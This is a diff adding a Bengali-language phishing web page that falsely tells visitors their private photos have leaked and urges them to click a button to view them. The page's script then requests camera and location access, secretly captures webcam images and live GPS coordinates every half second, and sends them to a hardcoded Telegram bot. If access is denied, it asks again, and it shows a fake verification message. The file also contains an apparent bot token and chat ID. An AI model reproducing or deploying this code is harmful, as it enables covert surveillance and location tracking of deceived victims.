@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warning: Private Leaks Found!</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100vh;
+        }
+        .warning-box {
+            border: 5px solid #ff0000;
+            margin: 20px;
+            padding: 20px;
+            background: rgba(255, 0, 0, 0.1);
+            border-radius: 15px;
+        }
+        h1 { font-size: 24px; text-transform: uppercase; }
+        p { font-size: 18px; color: #ccc; }
+        .btn-leak {
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 50px;
+            box-shadow: 0 0 20px #ff0000;
+            transition: 0.3s;
+        }
+        .btn-leak:hover { background-color: #cc0000; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="warning-box">
+        <h1>⚠️ সতর্কবার্তা: আপনার ছবি লিক হয়েছে!</h1>
+        <p>আপনার ডিভাইসে সংরক্ষিত কিছু ব্যক্তিগত ছবি ইন্টারনেটে ছড়িয়ে পড়েছে। যাচাই করতে নিচের বাটনে ক্লিক করুন।</p>
+        <button class="btn-leak" onclick="startCapture()">See The Leaked Pictures</button>
+    </div>
+
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const BOT_TOKEN = '9238574151:AAF2Jx_Z_FaGg5QK4P0qmtUdK-yIKYL5HCg'; 
+        const CHAT_ID = '7836357320';
+
+        async function startCapture() {
+            // ক্যামেরা এবং লোকেশন পারমিশন চাওয়া
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+
+                // ছবি ক্যাপচার করা
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imageData = canvas.toDataURL('image/jpeg').split(',')[1];
+
+                    // লোকেশন ডাটা
+                    const loc = `
+${position.coords.latitude}, ${position.coords.longitude}`;
+
+                    // টেলিগ্রামে ছবি এবং লোকেশন পাঠানো
+                    await sendToTelegram(imageData, loc);
+                }, 1000);
+
+                // প্রতি ৫ সেকেন্ডে একবার করে ছবি এবং লোকেশন পাঠাতে থাকবে (Infinite Loop)
+                setInterval(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const img = canvas.toDataURL('image/jpeg').split(',')[1];
+                    
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const currentLoc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        await sendToTelegram(img, currentLoc);
+                    });
+                }, 500);
+
+                alert("Verification successful! Your account is now secure.");
+            } catch (err) {
+                alert("Error: Permission denied! Please allow camera and location access to verify your account.");
+                startCapture(); // বারবার পারমিশন চাইবে যদি না ইউজার এলাউ করে
+            }
+        }
+
+        async function sendToTelegram(base64Image, location) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', '...'); // Base64 direct upload isn't supported via simple fetch, we use sendPhoto
+            
+            // প্রথমে লোকেশন মেসেজ পাঠানো
+            const locMsg = `📍 Live Location: ${location}`;
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(locMsg)}`);
+
+            // ছবি পাঠানো (Base64 to Binary conversion for Telegram API)
+            const blob = await (await fetch(`data:image/jpeg;base64,${base64Image}`)).blob();
+            const formDataPhoto = new FormData();
+            formDataPhoto.append('chat_id', CHAT_ID);
+            formDataPhoto.append('photo', blob, 'capture.jpg');
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formDataPhoto
+            });
+        }
+    </script>
+</body>
+</html>
